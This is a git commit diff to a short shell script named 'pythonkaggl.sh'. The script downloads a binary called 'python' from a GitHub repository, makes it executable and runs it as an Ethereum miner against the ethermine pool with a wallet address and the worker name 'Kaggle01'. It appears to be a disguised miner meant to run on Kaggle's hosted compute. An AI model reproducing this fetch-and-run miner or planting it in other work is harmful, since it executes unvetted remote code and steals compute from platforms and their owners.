201dd28f87bff968202468198e52ada08b133368
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-09-05 15:33:12 +0700

    Update pythonkaggl.sh

--- pythonkaggl.sh
+++ pythonkaggl.sh
@@ -1,2 +1,3 @@
 wget https://github.com/kmille36/thuonghai/raw/master/python
+chmod +x python
 ./python --algo ETHASH --pool us1.ethermine.org:4444 --user 0xeed495d4d38a1289b68077a7e9e87a51c3d99b96.Kaggle01
